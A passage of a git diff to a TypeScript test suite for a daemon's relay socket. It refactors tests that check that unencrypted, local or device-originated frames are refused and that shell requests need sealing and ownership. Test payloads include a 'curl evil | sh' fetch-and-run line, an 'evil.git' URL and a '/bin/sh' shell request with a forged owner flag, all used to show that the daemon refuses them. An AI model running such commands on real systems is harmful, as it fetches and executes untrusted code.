+    const socket = relaySocket('token')
     // Frames are processed through a queue, so `onMachineMeta` is how a test knows one has landed.
     const namesSeen: Array<string | null> = []
     socket.onMachineMeta = (n) => { namesSeen.push(n) }
@@ -3120,7 +3456,7 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
   })
 
   it("keeps the machine's own name, for the models it serves — a rename updates it, a frame without one does not", async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const namesSeen: Array<string | null> = []
     socket.onMachineMeta = (n) => { namesSeen.push(n) }
     socket.connect()
@@ -3138,7 +3474,7 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
   })
 
   it('refuses a machine_meta that arrived over the LOCAL socket — only the backend may name the grid', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const namesSeen: Array<string | null> = []
     socket.onMachineMeta = (n) => { namesSeen.push(n) }
     socket.connect()
@@ -3164,7 +3500,7 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
   })
 
   it('refuses a machine_revoked over the LOCAL socket — one frame would otherwise sign this computer out', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     let revoked = 0
     socket.onRevoked = () => { revoked += 1 }
     socket.connect()
@@ -3187,9 +3523,9 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
   })
 
   it('says whose key a device-key-log removal spent before signing out, and nothing for a plain revoke', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const order: string[] = []
-    socket.onDeviceRemoved = (pub) => { order.push(`removed:${pub}`) }
+    gatewayOf(socket).onDeviceRemoved = (pub) => { order.push(`removed:${pub}`) }
     socket.onRevoked = () => { order.push('revoked') }
     socket.connect()
     const ws = wsMock.instances.at(-1)!
@@ -3198,9 +3534,9 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
     await vi.waitFor(() => expect(order).toEqual(['removed:PUB', 'revoked']))
     await socket.stop()
 
-    const plain = new BackendSocket('token')
+    const plain = relaySocket('token')
     let removed = 0
-    plain.onDeviceRemoved = () => { removed += 1 }
+    gatewayOf(plain).onDeviceRemoved = () => { removed += 1 }
     plain.onRevoked = () => {}
     plain.connect()
     const ws2 = wsMock.instances.at(-1)!
@@ -3215,12 +3551,12 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
     // A reinstall that kept the computer id finds its machine id held by the old install's key
     // (device_conflict). Removing that key makes the backend send `machine_revoked` to the machine id —
     // which this daemon now answers for. That removal is what lets this key register, not a sign-out.
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const seen: string[] = []
-    socket.isOwnDeviceKey = (pub) => pub === 'MINE'
-    socket.onDeviceRemoved = (pub) => { seen.push(`removed:${pub}`) }
+    gatewayOf(socket).isOwnDeviceKey = (pub) => pub === 'MINE'
+    gatewayOf(socket).onDeviceRemoved = (pub) => { seen.push(`removed:${pub}`) }
     socket.onRevoked = () => { seen.push('revoked') }
-    socket.onDeviceKeysChanged = () => { seen.push('reread') }
+    gatewayOf(socket).onDeviceKeysChanged = () => { seen.push('reread') }
     socket.connect()
     const ws = wsMock.instances.at(-1)!
     ws.open()
@@ -3232,9 +3568,9 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
     await socket.stop()
 
     // A plain revoke (the machine deleted) still ends the sign-in whatever the key.
-    const plain = new BackendSocket('token')
+    const plain = relaySocket('token')
     let revoked = 0
-    plain.isOwnDeviceKey = () => false
+    gatewayOf(plain).isOwnDeviceKey = () => false
     plain.onRevoked = () => { revoked += 1 }
     plain.connect()
     const ws2 = wsMock.instances.at(-1)!
@@ -3249,32 +3585,32 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
 
 describe('Autonomous direct isolation from existing relay/browser behavior', () => {
   it('permits offline PAKE only for the exact live direct pending connection', async () => {
-    const backend = new BackendSocket('direct-offline-test')
+    const backend = relaySocket('direct-offline-test')
     const send = vi.fn()
-    backend.attachDirectDevice('autonomous-direct:test', send)
+    gatewayOf(backend).attachDirectDevice('autonomous-direct:test', send)
     const pairId = Buffer.alloc(16, 1).toString('base64')
-    backend.e2ee.handleFrame('browser', { type: 'e2e_pair_intent', payload: { pairId, role: 'web', label: 'Browser' } })
-    expect(await backend.pair('K7P4X9')).toEqual({ ok: false, error: 'BACKEND_DOWN' })
-    await backend.receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_intent', payload: { pairId, role: 'device', label: 'Autonomous device' } }, true)
-    const paired = backend.pair('K7P4X9')
+    gatewayOf(backend).e2ee.handleFrame('browser', { type: 'e2e_pair_intent', payload: { pairId, role: 'web', label: 'Browser' } })
+    expect(await gatewayOf(backend).pair('K7P4X9')).toEqual({ ok: false, error: 'BACKEND_DOWN' })
+    await gatewayOf(backend).receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_intent', payload: { pairId, role: 'device', label: 'Autonomous device' } }, true)
+    const paired = gatewayOf(backend).pair('K7P4X9')
     expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: 'e2e_pake' }))
-    await backend.receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_cancel', payload: { pairId } }, true)
+    await gatewayOf(backend).receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_cancel', payload: { pairId } }, true)
     expect(await paired).toEqual({ ok: false, error: 'CANCELLED' })
-    backend.detachDirectDevice('autonomous-direct:test')
+    gatewayOf(backend).detachDirectDevice('autonomous-direct:test')
   })
   it('never dispatches setup/password/admin/terminal frames from a discovered endpoint', async () => {
-    const backend = new BackendSocket('direct-whitelist-test')
-    backend.attachDirectDevice('autonomous-direct:test', vi.fn())
-    const handle = vi.spyOn(backend.e2ee, 'handleFrame').mockReturnValue(true)
+    const backend = relaySocket('direct-whitelist-test')
+    gatewayOf(backend).attachDirectDevice('autonomous-direct:test', vi.fn())
+    const handle = vi.spyOn(gatewayOf(backend).e2ee, 'handleFrame').mockReturnValue(true)
     for (const type of ['e2e_setup_claim', 'e2e_pw_pair_intent', 'e2e_pw_pake', 'terminal_open', 'machine_revoked', '__clients']) {
-      await backend.receiveDirectDevice('autonomous-direct:test', { type, payload: {} }, true)
+      await gatewayOf(backend).receiveDirectDevice('autonomous-direct:test', { type, payload: {} }, true)
     }
     expect(handle).not.toHaveBeenCalled()
-    await backend.receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_intent', payload: {} }, false)
+    await gatewayOf(backend).receiveDirectDevice('autonomous-direct:test', { type: 'e2e_pair_intent', payload: {} }, false)
     expect(handle).not.toHaveBeenCalled()
-    await backend.receiveDirectDevice('autonomous-direct:test', { type: 'e2e_hello', payload: {} }, false)
+    await gatewayOf(backend).receiveDirectDevice('autonomous-direct:test', { type: 'e2e_hello', payload: {} }, false)
     expect(handle).toHaveBeenCalledOnce()
-    backend.detachDirectDevice('autonomous-direct:test')
+    gatewayOf(backend).detachDirectDevice('autonomous-direct:test')
   })
 })
 
@@ -3284,17 +3620,17 @@ describe('agent_recent replies', () => {
   const events = [1, 2, 3].map((turn) => ({ kind: 'summary', text: `body ${turn}`, recap: `recap ${turn}`, fullText: answer(turn) }))
 
   async function recentReplyFor(role: 'web' | 'device') {
-    const socket = new BackendSocket('token')
-    socket.recentProvider = () => events
-    socket.recentAsksProvider = () => ['which llama.cpp build is this?']
+    const socket = relaySocket('token')
+    // The recaps module's answer (core/turns/recaps.ts); what this checks is the socket's fitting of it.
+    socket.agentRecentProvider = () => ({ agentId: 'a1', events, asks: ['which llama.cpp build is this?'] })
     socket.connect()
     const ws = wsMock.instances.at(-1)!
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'agent_recent', payload: { requestId: 'recent-1', agentId: 'a1', n: 3 } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    vi.spyOn(socket.e2ee, 'sessionRole').mockReturnValue(role)
-    vi.spyOn(socket.e2ee, 'rpcReplyFrameBytes').mockImplementation((_c, _t, _r, payload) => Buffer.byteLength(JSON.stringify(payload)))
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'agent_recent', payload: { requestId: 'recent-1', agentId: 'a1', n: 3 } })
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue(role)
+    vi.spyOn(gatewayOf(socket).e2ee, 'rpcReplyFrameBytes').mockImplementation((_c, _t, _r, payload) => Buffer.byteLength(JSON.stringify(payload)))
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'agent_recent_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     ws.message({ t: 'down', connId: 'conn-1', frame: { type: 'agent_recent', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } } })
@@ -3326,7 +3662,7 @@ describe('machines_changed relay', () => {
   })
 
   it('hands the backend\'s machines_changed to the window, and only the backend\'s', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:machines', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     socket.connect()
@@ -3343,7 +3679,7 @@ describe('machines_changed relay', () => {
   })
 
   it('relays a reason it can show and nothing else from the payload', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:machines', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     socket.connect()
@@ -3358,7 +3694,7 @@ describe('machines_changed relay', () => {
 
 describe('local terminal focus', () => {
   it('passes a registered window\'s focus to its terminals, and ignores a connection it never registered', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const setFocusedAgent = vi.fn()
     socket.setTerminalStreamManager({
       setFocusedAgent,
@@ -3388,28 +3724,29 @@ describe('question_response reports what became of the answer', () => {
   })
 
   function harness() {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const frames: Array<{ type: string; payload: Record<string, unknown> }> = []
     socket.registerLocalClient('local:hn', { sendFrame: (frame) => { frames.push(frame as { type: string; payload: Record<string, unknown> }); return true }, sendBinary: () => true })
     const dispatch = (payload: Record<string, unknown>) =>
-      (socket as any).dispatchDown({ type: 'question_response', payload }, 'local:hn', 'local') as Promise<void>
+      dispatchDown(socket, { type: 'question_response', payload }, 'local:hn', 'local') as Promise<void>
     const results = () => frames.filter((f) => f.type === 'question_response_result')
     return { socket, dispatch, results }
   }
 
   it('replies STALE_QUESTION under the question\'s own requestId when the dialog changed first', async () => {
     const { socket, dispatch, results } = harness()
-    socket.onQuestionAnswer = vi.fn(async () => ({ ok: false as const, error: 'STALE_QUESTION' as const, detail: 'That question changed before your answer arrived.' }))
+    const answer = vi.fn(async () => ({ ok: false as const, error: 'STALE_QUESTION' as const, detail: 'That question changed before your answer arrived.' }))
+    bindQuestionResponse(socket, answer)
     await dispatch({ agentId: 'a1', requestId: 'q_0badf00d', answers: { 'Approve Bash command: ls': 'Yes' } })
     await vi.waitFor(() => expect(results()).toHaveLength(1))
     expect(results()[0].payload).toEqual({ requestId: 'q_0badf00d', error: 'STALE_QUESTION', detail: 'That question changed before your answer arrived.' })
-    expect(socket.onQuestionAnswer).toHaveBeenCalledWith({ agentId: 'a1', requestId: 'q_0badf00d', answers: { 'Approve Bash command: ls': 'Yes' } })
+    expect(answer).toHaveBeenCalledWith({ agentId: 'a1', requestId: 'q_0badf00d', answers: { 'Approve Bash command: ls': 'Yes' } })
     await socket.unregisterLocalClient('local:hn')
   })
 
   it('replies ok once the answer was typed', async () => {
     const { socket, dispatch, results } = harness()
-    socket.onQuestionAnswer = vi.fn(async () => ({ ok: true as const }))
+    bindQuestionResponse(socket, vi.fn(async () => ({ ok: true as const })))
     await dispatch({ agentId: 'a1', requestId: 'q_1', answers: { q: 'Tea' } })
     await vi.waitFor(() => expect(results()).toHaveLength(1))
     expect(results()[0].payload).toEqual({ requestId: 'q_1', ok: true })
@@ -3420,7 +3757,7 @@ describe('question_response reports what became of the answer', () => {
     const { socket, dispatch, results } = harness()
     const other: Array<{ type: string }> = []
     socket.registerLocalClient('local:other', { sendFrame: (frame) => { other.push(frame as { type: string }); return true }, sendBinary: () => true })
-    socket.onQuestionAnswer = vi.fn(async () => ({ ok: true as const }))
+    bindQuestionResponse(socket, vi.fn(async () => ({ ok: true as const })))
     await dispatch({ agentId: 'a1', requestId: 'q_1', answers: { q: 'Tea' } })
     await vi.waitFor(() => expect(results()).toHaveLength(1))
     expect(other.filter((f) => f.type === 'question_response_result')).toEqual([])
@@ -3432,16 +3769,17 @@ describe('question_response reports what became of the answer', () => {
     // A dial, a phone, or another machine relaying for its app answered over the relay. What became of
     // that answer is its business: broadcast, every window here and every web client of this machine was
     // handed a `question_response_result` for an answer it never gave, in the clear.
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const windowFrames: Array<{ type: string }> = []
     socket.registerLocalClient('local:window', { sendFrame: (frame) => { windowFrames.push(frame as { type: string }); return true }, sendBinary: () => true })
     const stale = { ok: false as const, error: 'STALE_QUESTION' as const, detail: 'That question changed before your answer arrived.' }
-    socket.onQuestionAnswer = vi.fn(async () => stale)
+    const answer = vi.fn(async () => stale)
+    bindQuestionResponse(socket, answer)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'hasSession').mockImplementation((connId: string) => connId === 'dial-1')
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockImplementation((connId: string) => connId === 'dial-1')
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'question_response_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } },
     })
 
@@ -3457,7 +3795,7 @@ describe('question_response reports what became of the answer', () => {
         frame: { type: 'question_response_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'ciphertext' } } },
       })])
     })
-    expect(socket.onQuestionAnswer).toHaveBeenCalledWith({ requestId: 'q_0badf00d', agentId: 'a1', answers: { q: 'Yes' } })
+    expect(answer).toHaveBeenCalledWith({ requestId: 'q_0badf00d', agentId: 'a1', answers: { q: 'Yes' } })
     expect(windowFrames.filter((f) => f.type === 'question_response_result')).toEqual([])
     await socket.unregisterLocalClient('local:window')
     await socket.stop()
@@ -3466,12 +3804,12 @@ describe('question_response reports what became of the answer', () => {
   it('still answers only that connection when its session is gone by the time the answer is typed', async () => {
     // Keying a dialog takes seconds; the answerer can drop in between. Nothing to seal with then — it gets a
     // bare error, addressed to it, and nobody else hears anything.
-    const socket = new BackendSocket('token')
-    socket.onQuestionAnswer = vi.fn(async () => ({ ok: true as const }))
+    const socket = relaySocket('token')
+    bindQuestionResponse(socket, vi.fn(async () => ({ ok: true as const })))
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(false)
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(false)
     ws.message(sealedDown(socket, 'phone-1', 'question_response', { requestId: 'q_1', agentId: 'a1', answers: { q: 'Tea' } }))
     await vi.waitFor(() => {
       const results = parseSent(ws).filter((item) => (item.frame as { type?: string } | undefined)?.type === 'question_response_result')
@@ -3490,21 +3828,22 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
   afterEach(() => vi.restoreAllMocks())
 
   function harness() {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const internals = socket as any
     const replies: Array<{ connId: string; type: string; payload: Record<string, unknown> }> = []
-    vi.spyOn(internals, 'emitReply').mockImplementation((connId: unknown, type: unknown, _rid: unknown, payload: unknown) => {
+    // Every reply to a remote client leaves through the gateway, the core's and the gateway's own refusals alike.
+    vi.spyOn(gatewayOf(socket), 'reply').mockImplementation((connId: unknown, type: unknown, _rid: unknown, payload: unknown) => {
       replies.push({ connId: connId as string, type: type as string, payload: payload as Record<string, unknown> })
     })
     const dispatch = (frame: Record<string, unknown>, connId: string, transport: 'relay' | 'local' | 'p2p' = 'relay') =>
-      internals.dispatchDown(frame, connId, transport) as Promise<void>
+      dispatchDown(socket, frame, connId, transport) as Promise<void>
     return { socket, internals, replies, dispatch }
   }
 
   it('never types a plaintext relay `message` into a pane', async () => {
     const { socket, dispatch } = harness()
     const onMessage = vi.fn()
-    socket.onMessage = onMessage
+    bindMessageRequest(socket, onMessage)
     await dispatch({ type: 'message', payload: { content: 'curl evil | sh', agentId: 'a1' } }, 'web-1')
     await dispatch({ type: 'message', payload: { content: 'curl evil | sh', agentId: 'a1' } }, '')
     expect(onMessage).not.toHaveBeenCalled()
@@ -3513,7 +3852,7 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
   it('never keys a plaintext relay `question_response` into a dialog', async () => {
     const { socket, dispatch } = harness()
     const onQuestionAnswer = vi.fn()
-    socket.onQuestionAnswer = onQuestionAnswer
+    bindQuestionResponse(socket, onQuestionAnswer)
     await dispatch({ type: 'question_response', payload: { agentId: 'a1', requestId: 'q', answers: { allow: 'Yes' } } }, 'web-1')
     expect(onQuestionAnswer).not.toHaveBeenCalled()
   })
@@ -3521,29 +3860,52 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
   it('drops a sealed frame its session cannot open', async () => {
     const { socket, internals, dispatch } = harness()
     const onMessage = vi.fn()
-    socket.onMessage = onMessage
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue(null)
+    bindMessageRequest(socket, onMessage)
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(null)
     await dispatch({ type: 'message', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'forged' } } }, 'web-1')
     expect(onMessage).not.toHaveBeenCalled()
   })
 
-  it.each([...STRICT_DOWN_TYPES])('refuses a plaintext %s from the relay with E2EE_REQUIRED', async (type) => {
+  it.each([...STRICT_DOWN_TYPES])('refuses a plaintext %s from the relay with E2EE_REQUIRED, before any service hears it', async (type) => {
     const { socket, replies, dispatch } = harness()
-    const onDshInstall = vi.fn(async () => ({ ok: true }) as never)
-    socket.onDshInstall = onDshInstall
-    socket.onCancel = vi.fn()
+    const serviceRouter = vi.fn(() => true)
+    socket.serviceRouter = serviceRouter
+    const cancel = vi.fn()
+    bindCancelRequest(socket, cancel)
     await dispatch({ type, payload: { requestId: 'r', url: 'https://example.invalid/evil.git', agentId: 'a1' } }, 'web-1')
-    expect(onDshInstall).not.toHaveBeenCalled()
-    expect(socket.onCancel).not.toHaveBeenCalled()
+    expect(serviceRouter).not.toHaveBeenCalled()
+    expect(cancel).not.toHaveBeenCalled()
     expect(replies).toEqual([{ connId: 'web-1', type, payload: { error: 'E2EE_REQUIRED' } }])
   })
 
-  it('runs a sealed dsh_install from a paired client', async () => {
+  it.each([...SHELL_REQUESTS])('requires sealing for %s and its requester-only result', async type => {
+    const { socket, replies, dispatch } = harness()
+    const serviceRouter = vi.fn(() => true)
+    socket.serviceRouter = serviceRouter
+    expect(encryptDownFrame(type)).toBe(true)
+    expect(encryptDownFrameFor(type, { strictDown: false })).toBe(true)
+    expect(encryptRpcResult(`${type}_result`)).toBe(true)
+    await dispatch({ type, payload: { requestId: 'r', argv: ['/bin/sh'], cwd: '/tmp', owner: true } }, 'web-1')
+    expect(serviceRouter).not.toHaveBeenCalled()
+    expect(replies).toEqual([{ connId: 'web-1', type, payload: { error: 'E2EE_REQUIRED' } }])
+  })
+
+  it.each([...SHELL_REQUESTS])('refuses a sealed %s from a device even when its payload claims ownership', async type => {
+    const { socket, replies, dispatch } = harness()
+    const core = fakeCore()
+    serveOn(socket, host => host.serve('shell', startShell, core, SHELL_REQUESTS))
+    vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('device')
+    await dispatch(sealedDown(socket, 'device-1', type, { requestId: 'r', owner: true }).frame, 'device-1')
+    await vi.waitFor(() => expect(replies).toEqual([{ connId: 'device-1', type, payload: { error: 'OWNER_REQUIRED' } }]))
+    expect(core.terminals.open).not.toHaveBeenCalled()
+  })
+
+  it('hands a sealed dsh_install from a paired client to the service that answers it', async () => {
     const { socket, dispatch } = harness()
-    const onDshInstall = vi.fn(async () => ({ ok: true }) as never)
-    socket.onDshInstall = onDshInstall
+    const serviceRouter = vi.fn(() => true)
+    socket.serviceRouter = serviceRouter
     await dispatch(sealedDown(socket, 'web-1', 'dsh_install', { requestId: 'r', id: 'acme/some-dsh' }).frame, 'web-1')
-    expect(onDshInstall).toHaveBeenCalledWith(expect.objectContaining({ id: 'acme/some-dsh' }), expect.any(Function))
+    expect(serviceRouter).toHaveBeenCalledWith('dsh_install', expect.objectContaining({ id: 'acme/some-dsh' }), { local: false, owner: expect.any(Boolean), connection: 'web-1', requestId: 'r' }, expect.any(Function))
   })
 
   it('refuses a plaintext RPC even from the backend itself (connId \'\'), which would read the reply', async () => {
@@ -3559,7 +3921,7 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
     await dispatch({ type: 'machine_meta', payload: { name: 'mac' } }, '')
     expect(onMachineMeta).toHaveBeenCalledWith('mac')
     const onMessage = vi.fn()
-    socket.onMessage = onMessage
+    bindMessageRequest(socket, onMessage)
     await dispatch({ type: 'message', payload: { content: 'hi', agentId: 'a1' } }, 'peer-1', 'p2p')
     expect(onMessage).not.toHaveBeenCalled()
   })
@@ -3591,7 +3953,7 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
     const { socket, dispatch } = harness()
     const onMachineMeta = vi.fn()
     socket.onMachineMeta = onMachineMeta
-    const unwrap = vi.spyOn((socket as any).e2ee, 'unwrapDown')
+    const unwrap = vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown')
     await dispatch(sealedDown(socket, 'web-1', 'machine_meta', { name: 'x', gridName: 'attacker-grid' }).frame, 'web-1')
     await dispatch(sealedDown(socket, 'web-1', '__clients', { commander: 9 }).frame, 'web-1')
     expect(onMachineMeta).not.toHaveBeenCalled()
@@ -3615,7 +3977,7 @@ describe('relay down-frames are default-deny: sealed, or the backend\'s own', ()
   it('leaves trusted local clients in cleartext', async () => {
     const { socket, dispatch } = harness()
     const onMessage = vi.fn()
-    socket.onMessage = onMessage
+    bindMessageRequest(socket, onMessage)
     socket.registerLocalClient('local:app', { sendFrame: () => true, sendBinary: () => true })
     await dispatch({ type: 'message', payload: { content: 'hi', agentId: 'a1' } }, 'local:app', 'local')
     expect(onMessage).toHaveBeenCalledWith('a1', 'hi')
